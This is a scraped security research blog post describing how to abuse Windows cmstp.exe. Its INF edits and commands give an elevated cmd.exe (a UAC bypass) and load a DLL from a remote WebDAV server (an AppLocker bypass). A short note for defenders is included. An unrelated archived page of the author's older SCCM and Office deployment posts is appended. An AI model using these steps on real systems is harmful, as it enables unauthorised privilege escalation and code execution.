<https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e#file-corpvpn-cmp>

<https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e#file-corpvpn-cms>

<https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e#file-corpvpn-inf>

Adjust the [RegisterOCXSection] in the inf file to point to your DLL hosted on your Webdav server.

Then run this command (The names of the files are important):

```
cmstp.exe /ni /s c:\cmstp\CorpVPN.inf

```

[![](https://oddvar.moe/wp-content/uploads/2017/08/webdavdllloadblog.gif?w=700)](https://oddvar.moe/wp-content/uploads/2017/08/webdavdllloadblog.gif)

# UAC Bypass – Walkthrough

In this section of my post I want to go through all the steps I did to get this working. I know there is a lot of screenshots, but I thought I would give you everything I have. 🙂

If you start cmstp.exe with no parameters you get this:

![](https://oddvar.moe/wp-content/uploads/2017/08/081517_0002_researchonc1.png?w=700)

I figured out it would be interesting to see how we can create these profiles and how they are installed.

After some reading I found out that CMAK (Connection Manager Administration Kit) is a Windows feature so I went ahead and enabled it like this Windows like this:

![](https://oddvar.moe/wp-content/uploads/2017/08/081517_0002_researchonc2.png?w=700)

When the feature is done installing you can start CMAK by finding it in the start menu.

The Icon looks like this:

![](https://oddvar.moe/wp-content/uploads/2017/08/081517_0002_researchonc3.png?w=700)

After starting CMAK you are presented to wizard. The following screenshots are the options I choose when I did this:

![](https://oddvar.moe/wp-content/uploads/2017/08/081517_0002_researchonc4.png?w=700)

![](https://oddvar.moe/wp-content/uploads/2017/08/081517_0002_researchonc5.png?w=700)

![](https://oddvar.moe/wp-content/uploads/2017/08/081517_0002_researchonc6.png?w=700)

![](https://oddvar.moe/wp-content/uploads/2017/08/081517_0002_researchonc7.png?w=700)

![](https://oddvar.moe/wp-content/uploads/2017/08/081517_0002_researchonc8.png?w=700)

![](https://oddvar.moe/wp-content/uploads/2017/08/081517_0002_researchonc9.png?w=700)

![](https://oddvar.moe/wp-content/uploads/2017/08/081517_0002_researchonc10.png?w=700)

![](https://oddvar.moe/wp-content/uploads/2017/08/081517_0002_researchonc11.png?w=700)

![](https://oddvar.moe/wp-content/uploads/2017/08/081517_0002_researchonc12.png?w=700)

![](https://oddvar.moe/wp-content/uploads/2017/08/081517_0002_researchonc13.png?w=700)

![](https://oddvar.moe/wp-content/uploads/2017/08/081517_0002_researchonc14.png?w=700)

![](https://oddvar.moe/wp-content/uploads/2017/08/081517_0002_researchonc15.png?w=700)

![](https://oddvar.moe/wp-content/uploads/2017/08/081517_0002_researchonc16.png?w=700)

![](https://oddvar.moe/wp-content/uploads/2017/08/081517_0002_researchonc17.png?w=700)

![](https://oddvar.moe/wp-content/uploads/2017/08/081517_0002_researchonc18.png?w=700)

![](https://oddvar.moe/wp-content/uploads/2017/08/081517_0002_researchonc19.png?w=700)

![](https://oddvar.moe/wp-content/uploads/2017/08/081517_0002_researchonc20.png?w=700)

![](https://oddvar.moe/wp-content/uploads/2017/08/081517_0002_researchonc21.png?w=700)

![](https://oddvar.moe/wp-content/uploads/2017/08/081517_0002_researchonc22.png?w=700)

![](https://oddvar.moe/wp-content/uploads/2017/08/081517_0002_researchonc23.png?w=700)

![](https://oddvar.moe/wp-content/uploads/2017/08/081517_0002_researchonc24.png?w=700)

The files are now located in that path showed in the wizard. In my case this is:

```
C:\Program Files\CMAK\Profiles\Windows Vista and above\CorpVPN

```

![](https://oddvar.moe/wp-content/uploads/2017/08/081517_0002_researchonc25.png?w=700)

The .exe and .sed are actually IEXPRESS (a binary used to create an “installer” in Windows) files. They can be ignored. More on IEXPRESS here: <https://en.wikipedia.org/wiki/IExpress>

Now the fun starts.

Create a folder on the root of your C: drive called CMSTP. Copy the CorpVPN.inf file to the folder like this:

![](https://oddvar.moe/wp-content/uploads/2017/08/081517_0002_researchonc26.png?w=700)

Now open the inf file in Notepad and scroll down to the RunPreSetupCommandsSection and add these two lines of code (The first line is the command you want to run elevated):

```
c:\windows\system32\cmd.exe
taskkill /IM cmstp.exe /F

```

![](https://oddvar.moe/wp-content/uploads/2017/08/081517_0002_researchonc27.png?w=700)

You also need to comment out two lines with ;.

The two lines are

CopyFiles=Xnstall.CopyFiles, Xnstall.CopyFiles.ICM

AddReg=Xnstall.AddReg.AllUsers

![](https://oddvar.moe/wp-content/uploads/2017/08/081517_0002_researchonc28.png?w=700)

Now if you run the following command and click ok you will get an elevated prompt:

```
C:\Windows\System32\cmstp.exe c:\cmstp\corpvpn.inf /au

```

![](https://oddvar.moe/wp-content/uploads/2017/08/081517_0002_researchonc29.png?w=700)

The strange thing is that this executable is not supposed to “auto elevate”.

If we run the sigcheck tool against the file to dump the manifest we can confirm that this is true:

![](https://oddvar.moe/wp-content/uploads/2017/08/081517_0002_researchonc30.png?w=700)

Also, if we check the integrity level of the process we can confirm that it is not elevated by default and is running in medium integrity level:

![](https://oddvar.moe/wp-content/uploads/2017/08/081517_0002_researchonc31.png?w=700)

The fun thing now is that we can use sendkeys from a script to automate this. All we need to send is enter.

This feels really old school and noobish, but works in this case. Microsoft have implemented security measures ([UIPI](https://en.wikipedia.org/wiki/User_Interface_Privilege_Isolation)) in the past to prevent sendkey attacks so I am amazed that this works. I think it is a little cool at least….

I created a really simple script that I use to demonstrate this:

<https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e#file-uacbypasscmstp-ps1>

I also have a pre-made UACBypass.inf file here so you don’t have to follow the wizard and do the hasle with installing CMAK:

<https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e#file-uacbypass-inf>

I have not had the time to reverse CMSTP to see what goes on behind the curtain as it elevates, but this could be interesting for someone to research further.

I will at least give look if I get some more time.

A gif demonstrating this is placed on the top of the blogpost under the TL;DR section.

**UPDATE 16.08.2017:**

[FireF0X](https://twitter.com/hFireF0X) pointed out one important thing. This research lacks why this is happening. [FireF0X](https://twitter.com/hFireF0X) has been so kind to explain on twitter on why this happens.

<Quote> Your research lack explanation of why it happens. The reason is autoelevated COM interface CMLUAUTIL from cmlua.dll, it has ShellExec and some more methods which also maybe out of interest. I think you can just run methods from this interface directly without “sendkeys”

\*CMSTPLUA/cmstplua.dll

</Quote>

[FireF0x](https://twitter.com/hFireF0X) also posted a gist here <https://gist.github.com/hfiref0x/196af729106b780db1c73428b5a5d68d> with code on how to do it.

I am really happy that I triggered someone to do more with this and thanks to FireF0X for making this discovery even better. 🙂

## DLL loading from Webdav server – Walkthrough

I also found out that you can load DLL files from a Webdav server and execute them. This can for instance be used to bypass AppLocker in certain scenarios.

To do this you can follow the same CMAK wizard as we did in the UAC bypass.

The things you need to add to the INF file is the following (You could also load dll from disk):

```
[RegisterOCXSection]
\\10.10.10.10\webdav\AllTheThings.dll

```

It should look like this:

![](https://oddvar.moe/wp-content/uploads/2017/08/081517_0002_researchonc32.png?w=700)

Before you run this command, you will also need to have the CorpVPN.cmp and CorpVPN.cms in the same folder as the inf file:

![](https://oddvar.moe/wp-content/uploads/2017/08/081517_0002_researchonc33.png?w=700)

And of course your DLL file needs to be placed on the Webdav server.

You should now be able to run the following command to load the DLL from a Webdav server.

```
cmstp.exe /ni /s c:\cmstp\CorpVPN.inf

```

Note that this will actually install a VPN profile, I have not found any clever ways of just loading the DLL yet.

AllTheThings.dll is borrowed from the almighty Casey Smith aka [@Subtee](https://twitter.com/subTee) – And can be found here:

<https://github.com/subTee/AllTheThings> – Thanks Casey!

**Defenders;** I would start looking into CMSTP and if you have Device Guard/AppLocker I would suggest blocking it. (Unless you are dependant on using it for VPN connection installation)

Hope you have enjoyed this post and that it inspired you to conduct your own research and maybe you have some own ideas you want to try out on CMSTP.

### Share this:

* [Twitter](https://oddvar.moe/2017/08/15/research-on-cmstp-exe/?share=twitter "Click to share on Twitter")
* [Facebook](https://oddvar.moe/2017/08/15/research-on-cmstp-exe/?share=facebook "Click to share on Facebook")
Like Loading...
### *Related*

Tagged [bypass](https://oddvar.moe/tag/bypass/), [hacking](https://oddvar.moe/tag/hacking/), [research](https://oddvar.moe/tag/research/), [UAC](https://oddvar.moe/tag/uac/)

## Post navigation

[Previous Post Bypassing Device guard UMCI using CHM – CVE-2017-8625](https://oddvar.moe/2017/08/13/bypassing-device-guard-umci-using-chm-cve-2017-8625/)[Next Post Defense-In-Depth write-up](https://oddvar.moe/2017/09/13/defense-in-depth-writeup/)

## 21 thoughts on “Research on CMSTP.exe”

1. ![](https://2.gravatar.com/avatar/b97d0f68817919bf3dac95ead88be5a02c35d8c3c06bc854ee87bde89bdf930b?s=100&d=wavatar&r=G) **Shubham** says:
   [20 Aug 2017 at 3:46 am](https://oddvar.moe/2017/08/15/research-on-cmstp-exe/#comment-33)

   Brilliant post !

   [Like](https://oddvar.moe/2017/08/15/research-on-cmstp-exe/?like_comment=33&_wpnonce=f01f1ea792)Like

   [Reply](https://oddvar.moe/2017/08/15/research-on-cmstp-exe/?replytocom=33#respond)
3. ![](https://2.gravatar.com/avatar/2742c291c2aeb1fda4cb33376a9b7338fa66c72521d307e892aced24754b3c3d?s=100&d=wavatar&r=G) **Tyler** says:
   [21 Aug 2017 at 2:17 am](https://oddvar.moe/2017/08/15/research-on-cmstp-exe/#comment-34)

   Hey, killer post! I was able to shorten the UACBypass.inf file to just a few lines. This does not trigger any errors, and also does not install the VPN profile in ncpa.cpl.

   <https://pastebin.com/u5fsPLUA> <– shortened .inf

   [Like](https://oddvar.moe/2017/08/15/research-on-cmstp-exe/?like_comment=34&_wpnonce=24b8c12b61)Like

   [Reply](https://oddvar.moe/2017/08/15/research-on-cmstp-exe/?replytocom=34#respond)
   1. ![](https://2.gravatar.com/avatar/2742c291c2aeb1fda4cb33376a9b7338fa66c72521d307e892aced24754b3c3d?s=100&d=wavatar&r=G) **Tyler** says:
      [21 Aug 2017 at 3:15 am](https://oddvar.moe/2017/08/15/research-on-cmstp-exe/#comment-35)

      Alright – more tweaks. I took your todo and ran with it. The shortened .INF file is now a Here-String that takes an argument for the command to run, and outputs it to $emv:temp.

      <https://gist.github.com/tylerapplebaum/ae8cb38ed8314518d95b2e32a6f0d3f1#file-uacbypasscmstp-ps1>

      [Like](https://oddvar.moe/2017/08/15/research-on-cmstp-exe/?like_comment=35&_wpnonce=c42df99b02)Like

      [Reply](https://oddvar.moe/2017/08/15/research-on-cmstp-exe/?replytocom=35#respond)
   3. ![](https://1.gravatar.com/avatar/739f1937a78b0adcf9e9299e625c6b3a1d3a22b69a647bb2db49efc9c2559c93?s=100&d=wavatar&r=G) **Oddvar Moe** says:
      [22 Aug 2017 at 7:52 pm](https://oddvar.moe/2017/08/15/research-on-cmstp-exe/#comment-36)

      Awesome stuff Tyler!

      [Like](https://oddvar.moe/2017/08/15/research-on-cmstp-exe/?like_comment=36&_wpnonce=a59343a3eb)Like

      [Reply](https://oddvar.moe/2017/08/15/research-on-cmstp-exe/?replytocom=36#respond)
5. Pingback: [【技术分享】利用CMSTP.exe实现UAC Bypass和加载DLL - 莹莹之色](http://hack.hk.cn/2017/08/24/%E3%80%90%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB%E3%80%91%E5%88%A9%E7%94%A8cmstp-exe%E5%AE%9E%E7%8E%B0uac-bypass%E5%92%8C%E5%8A%A0%E8%BD%BDdll/)
7. Pingback: [半月安全看看看2017八月下 – 安全0day](http://www.netsec0day.com/?p=434)
9. Pingback: [My Reading List Q3 2017 | Bigta](https://bigta.wordpress.com/2017/10/08/my-reading-list-q3-2017/)
11. Pingback: [AppLocker Bypass – CMSTP | Penetration Testing Lab](http://pentestlab.blog/2018/05/10/applocker-bypass-cmstp/)
13. Pingback: [AppLocker Bypass – CMSTP | Penetration Testing Lab | Information Security, latest Hacking News, Cyber Security, Network Security](http://www.hackwolrdwide.com/applocker-bypass-cmstp-penetration-testing-lab/general/news/2018/)
15. Pingback: [利用CMSTP绕过AppLocker并执行代码 – 安百科技](http://vul.anbai.com/134287.html)
17. Pingback: [使用CMSTP绕过AppLocker的方法介绍 – 安百科技](http://vul.anbai.com/136159.html)
19. Pingback: [Bỏ qua AppLocker – CMSTP | Phòng thử nghiệm thâm nhập | Top - Tin tức an ninh mạng nhanh nhất Việt Nam](http://anninhmang24h.com/bo-qua-applocker-cmstp-phong-thu-nghiem-tham-nhap/)
21. Pingback: [Linked Blog: Detecting CMSTP-Enabled Code Execution and UAC Bypass With Sysmon. – Guided Security](https://guidedhunting.wordpress.com/2018/07/10/linked-blog-detecting-cmstp-enabled-code-execution-and-uac-bypass-with-sysmon/)
23. Pingback: [[11.18]骚姿势记录及测试视频 – 即刻安全](http://www.secist.com/archives/7291.html)
25. Pingback: [How to bypass UAC in newer Windows Versions - who-ami - Hacker Zon3](http://www.who-ami.net/how-to-bypass-uac-in-newer-windows-versions/)
27. Pingback: [TAU Threat Analyis: Medusa Locker Ransomware | VMware Carbon Black](https://www.carbonblack.com/2020/06/03/tau-threat-analyis-medusa-locker-ransomware/)
29. Pingback: [TAU Threat Analysis: Medusa Locker Ransomware](https://www.malware.studio/blog/2020/06/04/tau-threat-analysis-medusa-locker-ransomware/)
31. Pingback: [UAC Bypass: Analisi di Medusa Ransomware e Warzone RAT – Malverse](http://malverse.it/uac-bypass-analisi-di-medusa-ransomware-e-warzone-rat)
33. Pingback: [Arkham (Hack The Box Writeup) – Steven Meow's Blog 🐱](https://blog.stevenyu.tw/2022/10/15/arkham-hack-the-box-writeup/)
35. Pingback: [SideWinder APT’s post-exploitation framework analysis – Blog Website](https://bizreports.site/sidewinder-apts-post-exploitation-framework-analysis/)
37. Pingback: [Beyond the Surface: the evolution and expansion of the SideWinder APT group - osint10x](https://osint10x.com/beyond-the-surface-the-evolution-and-expansion-of-the-sidewinder-apt-group/)

### Leave a comment [Cancel reply](/2017/08/15/research-on-cmstp-exe/#respond)

Δ

This site uses Akismet to reduce spam. [Learn how your comment data is processed.](https://akismet.com/privacy/)

* [Facebook](https://www.facebook.com/oddvarmoe)
* [LinkedIn](https://www.linkedin.com/in/oddvarmoe/)
* [Twitter](http://www.twitter.com/oddvarmoe)

Search for:

[Website Powered by WordPress.com](https://wordpress.com/?ref=footer_custom_powered).

* [Comment](https://oddvar.moe/2017/08/15/research-on-cmstp-exe/#comments)
* Reblog
* Subscribe
  Subscribed

  + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Oddvar Moe's Blog](https://oddvar.moe)

  Join 41 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Foddvar.moe%252F2017%252F08%252F15%252Fresearch-on-cmstp-exe%252F)
* Privacy
* + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Oddvar Moe's Blog](https://oddvar.moe)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Foddvar.moe%252F2017%252F08%252F15%252Fresearch-on-cmstp-exe%252F)
  + [Copy shortlink](https://wp.me/p9lQpG-11S)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://oddvar.moe/2017/08/15/research-on-cmstp-exe/)
  + [View post in Reader](https://wordpress.com/read/blogs/138193392/posts/3960)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

##

##

Loading Comments...

Write a Comment...

Email (Required)

Name (Required)

Website

###

%d

![](https://pixel.wp.com/b.gif?v=noscript)



=== Content from web.archive.org_20c08e87_20250126_054318.html ===


[![Wayback Machine](https://web-static.archive.org/_static/images/toolbar/wayback-toolbar-logo-200.png)](/web/ "Wayback Machine home page")

[71 captures](/web/20120625102124%2A/http%3A//www.moe.am/ "See a list of every capture for this URL")
09 Oct 2008 - 18 Dec 2024

| [**Dec**](https://web.archive.org/web/20111230232937/http%3A//www.moe.am%3A80/ "30 Dec 2011") | JUN | [**Aug**](https://web.archive.org/web/20120831100530/http%3A//www.moe.am%3A80/ "31 Aug 2012") |
| [Previous capture](https://web.archive.org/web/20111230232937/http%3A//www.moe.am%3A80/ "23:29:37 Dec 30, 2011") | 25 | [Next capture](https://web.archive.org/web/20120831100530/http%3A//www.moe.am%3A80/ "10:05:30 Aug 31, 2012") |
| [**2011**](https://web.archive.org/web/20110130031756/http%3A//www.moe.am%3A80/ "30 Jan 2011") | 2012 | [**2013**](https://web.archive.org/web/20131026092241/http%3A//www.moe.am/ "26 Oct 2013") |

success
fail

 [About this capture](#expand)

COLLECTED BY

Organization: [Alexa Crawls](https://archive.org/details/alexacrawls)

Starting in 1996, [Alexa Internet](http://www.alexa.com/) has been donating their crawl data to the Internet Archive. Flowing in every day, these data are added to the [Wayback Machine](http://web.archive.org/) after an embargo period.

Collection: [Alexa Crawls](https://archive.org/details/alexacrawls)

Starting in 1996, [Alexa Internet](http://www.alexa.com/) has been donating their crawl data to the Internet Archive. Flowing in every day, these data are added to the [Wayback Machine](http://web.archive.org/) after an embargo period.

TIMESTAMPS

![loading](https://web-static.archive.org/_static/images/loading.gif)

The Wayback Machine - https://web.archive.org/web/20120625102124/http://www.moe.am:80/

[Oddvar Haaland Moe's Blog](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/)
My notes

* [Home](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/ "Home")
* [About me](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/about-me/ "About me")
* [SCCM](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/sccm-queries/ "SCCM")
  + [Driver Query Dell](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/sccm-queries/driver-query-dell/ "Driver Query Dell")
  + [Driver Query HP](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/sccm-queries/driver-query-hp/ "Driver Query HP")
  + [Other Queries](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/sccm-queries/other-queries/ "Other Queries")
  + [Unattend file](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/sccm-queries/unattend-file/ "Unattend file")
* [Tools I use often](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/tools-i-use-often/ "Tools I use often")
* [Various Scripts](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/various-scripts/ "Various Scripts")

KEEP IN TOUCH

Type your search

GO

# [New posts to a new place. MSitPros here I Come](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/2011/04/new-posts-to-a-new-place-msitpros-here-i-come/ "Permanent Link to New posts to a new place. MSitPros here I Come")

[Apr26
**2011**](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/2011/04/new-posts-to-a-new-place-msitpros-here-i-come/)
[[Leave a Comment](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/2011/04/new-posts-to-a-new-place-msitpros-here-i-come/#respond "Comment on New posts to a new place. MSitPros here I Come")](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/2011/04/new-posts-to-a-new-place-msitpros-here-i-come/#comments)
![](https://web.archive.org/web/20120625102124im_/http://1.gravatar.com/avatar/1111c7ff0cacbcf34197ee1b3b51f2e7?s=30&d=&r=G)
Written by **[Oddvar](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/author/oddvar/ "View all posts by Oddvar")**

Me and a couple of colleagues has established MSitPros.com, so all my future blog post will be posted there.
![](https://web.archive.org/web/20120625102124im_/http://www.moe.am/wp-content/uploads/042611_1007_Newpoststoa1.jpg)

Drop on by: [http://msitpros.com](https://web.archive.org/web/20120625102124/http%3A//msitpros.com/)

This blog will still be active as an archive, but I will not make any new posts here.

Rating 3.00 out of 5

**Posted in** [Blog](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/category/blog/ "View all posts in Blog")

# [Windows Thin PC aka WinTPC](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/2011/04/windows-thin-pc-aka-wintpc/ "Permanent Link to Windows Thin PC aka WinTPC")

[Apr05
**2011**](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/2011/04/windows-thin-pc-aka-wintpc/)
[[1 Comment](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/2011/04/windows-thin-pc-aka-wintpc/#comments "Comment on Windows Thin PC aka WinTPC")](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/2011/04/windows-thin-pc-aka-wintpc/#comments)
![](https://web.archive.org/web/20120625102124im_/http://1.gravatar.com/avatar/1111c7ff0cacbcf34197ee1b3b51f2e7?s=30&d=&r=G)
Written by **[Oddvar](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/author/oddvar/ "View all posts by Oddvar")**

Microsoft has just launched a beta program at connect for Windows Thin Pc. Its intention is to be able to install a light weight operating system to old machines and elevate VDI and terminal services. I just had to install it and test it out. And guess what, it looks great. See screen shoots below.

![](https://web.archive.org/web/20120625102124im_/http://www.moe.am/wp-content/uploads/040511_1209_WindowsThin1.png)

![](https://web.archive.org/web/20120625102124im_/http://www.moe.am/wp-content/uploads/040511_1209_WindowsThin2.png)

Cannot add or remove windows features. This is disabled.

![](https://web.archive.org/web/20120625102124im_/http://www.moe.am/wp-content/uploads/040511_1209_WindowsThin3.png)

Uses 2,67 GB of space after it is installed. (that’s small)

![](https://web.archive.org/web/20120625102124im_/http://www.moe.am/wp-content/uploads/040511_1209_WindowsThin4.png)

More info on thin pc can be found here:

[http://www.microsoft.com/windows/enterprise/solutions/virtualization/products/thinpc.aspx](https://web.archive.org/web/20120625102124/http%3A//www.microsoft.com/windows/enterprise/solutions/virtualization/products/thinpc.aspx)

Rating 3.00 out of 5

**Posted in** [Client](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/category/client/ "View all posts in Client"), [Deployment](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/category/deployment/ "View all posts in Deployment")
-
**Tagged** [Client](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/tag/client/), [Deployment](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/tag/deployment/), [Thin Pc](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/tag/thin-pc/), [Windows](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/tag/windows/)

# [Problems with Language packs with Windows 7 Service Pack 1](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/2011/03/problems-with-language-packs-with-windows-7-service-pack-1/ "Permanent Link to Problems with Language packs with Windows 7 Service Pack 1")

[Mar31
**2011**](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/2011/03/problems-with-language-packs-with-windows-7-service-pack-1/)
[[Leave a Comment](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/2011/03/problems-with-language-packs-with-windows-7-service-pack-1/#respond "Comment on Problems with Language packs with Windows 7 Service Pack 1")](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/2011/03/problems-with-language-packs-with-windows-7-service-pack-1/#comments)
![](https://web.archive.org/web/20120625102124im_/http://1.gravatar.com/avatar/1111c7ff0cacbcf34197ee1b3b51f2e7?s=30&d=&r=G)
Written by **[Oddvar](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/author/oddvar/ "View all posts by Oddvar")**

I recently had some problems injecting language packs offline into a Windows 7 Service pack 1 image file. After a lot of troubleshooting I realized that when Service pack 1 was released there were also released Service pack 1 versions of the language packs (dough!). The language packs can be downloaded from licensing.microsoft.com.

Rating 3.00 out of 5

**Posted in** [Deployment](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/category/deployment/ "View all posts in Deployment"), [SCCM](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/category/sccm/ "View all posts in SCCM")

# [USMT and Office 2010 settings](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/2011/03/usmt-and-office-2010-settings/ "Permanent Link to USMT and Office 2010 settings")

[Mar31
**2011**](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/2011/03/usmt-and-office-2010-settings/)
[[Leave a Comment](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/2011/03/usmt-and-office-2010-settings/#respond "Comment on USMT and Office 2010 settings")](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/2011/03/usmt-and-office-2010-settings/#comments)
![](https://web.archive.org/web/20120625102124im_/http://1.gravatar.com/avatar/1111c7ff0cacbcf34197ee1b3b51f2e7?s=30&d=&r=G)
Written by **[Oddvar](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/author/oddvar/ "View all posts by Oddvar")**

There has finally been released a hotfix to make USMT handle office 2010 settings.

[http://support.microsoft.com/kb/2023591](https://web.archive.org/web/20120625102124/http%3A//support.microsoft.com/kb/2023591)

Rating 4.00 out of 5

**Posted in** [Deployment](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/category/deployment/ "View all posts in Deployment"), [Office](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/category/office/ "View all posts in Office"), [SCCM](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/category/sccm/ "View all posts in SCCM")

# [Deploy Office 2010 with Different languages](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/2011/03/deploy-office-2010-with-different-languages/ "Permanent Link to Deploy Office 2010 with Different languages")

[Mar31
**2011**](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/2011/03/deploy-office-2010-with-different-languages/)
[[2 Comments](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/2011/03/deploy-office-2010-with-different-languages/#comments "Comment on Deploy Office 2010 with Different languages")](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/2011/03/deploy-office-2010-with-different-languages/#comments)
![](https://web.archive.org/web/20120625102124im_/http://1.gravatar.com/avatar/1111c7ff0cacbcf34197ee1b3b51f2e7?s=30&d=&r=G)
Written by **[Oddvar](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/author/oddvar/ "View all posts by Oddvar")**

As seen on my previous post [http://www.moe.am/index.php/2010/08/deploy-office-2010-with-integrated-language-packs/](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/2010/08/deploy-office-2010-with-integrated-language-packs/) I showed how to integrate language packs into one set of installation files for office.

In that post I also showed you how to put a config.xml in the root of the directory together with the setup.exe. Inside that XML file we added all the languages we wanted to add. In many cases you may want to only deploy a subset of languages. So how do we do that? This is easy. All you have to do is to create a XML file for what type of languages you want. Let’s say we want Spanish and English only. Then I have chosen to create a XML file called Spanish.xml and it looks like this:

```

<Configuration Product="ProPlus">
<Display Level="none" CompletionNotice="no" SuppressModal="Yes" AcceptEula="Yes" />
<AddLanguage Id="es-es" ShellTransform="yes"/>
<AddLanguage Id="en-us" />
<OptionState Id="OfficeMUI" State="Local" Children="force" />
</Configuration>

```

Then when I deploy office I just use this command to apply this config:

setup.exe /config Spanish.xml

If you also want to apply office customizations you can do this after the installation just by running the MSP package that you have created using setup.exe /admin

Good luck!

Rating 3.00 out of 5

**Posted in** [Deployment](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/category/deployment/ "View all posts in Deployment"), [Office](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/category/office/ "View all posts in Office")
-
**Tagged** [Deployment](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/tag/deployment/), [Office 2010](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/tag/office-2010/)

# [Windows 7 Service pack 1 is supported in SCCM](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/2011/03/windows-7-service-pack-1-is-supported-in-sccm/ "Permanent Link to Windows 7 Service pack 1 is supported in SCCM")

[Mar30
**2011**](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/2011/03/windows-7-service-pack-1-is-supported-in-sccm/)
[[Leave a Comment](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/2011/03/windows-7-service-pack-1-is-supported-in-sccm/#respond "Comment on Windows 7 Service pack 1 is supported in SCCM")](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/2011/03/windows-7-service-pack-1-is-supported-in-sccm/#comments)
![](https://web.archive.org/web/20120625102124im_/http://1.gravatar.com/avatar/1111c7ff0cacbcf34197ee1b3b51f2e7?s=30&d=&r=G)
Written by **[Oddvar](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/author/oddvar/ "View all posts by Oddvar")**

This is now supported. All you need is this hotfix:

[http://support.microsoft.com/kb/2489044/en-us](https://web.archive.org/web/20120625102124/http%3A//support.microsoft.com/kb/2489044/en-us)

Rating 3.00 out of 5

**Posted in** [Deployment](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/category/deployment/ "View all posts in Deployment"), [SCCM](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/category/sccm/ "View all posts in SCCM")

# [Custom Error Codes for Configuration Manager 2007](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/2011/03/custom-error-codes-for-configuration-manager-2007/ "Permanent Link to Custom Error Codes for Configuration Manager 2007")

[Mar16
**2011**](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/2011/03/custom-error-codes-for-configuration-manager-2007/)
[[Leave a Comment](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/2011/03/custom-error-codes-for-configuration-manager-2007/#respond "Comment on Custom Error Codes for Configuration Manager 2007")](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/index.php/2011/03/custom-error-codes-for-configuration-manager-2007/#comments)
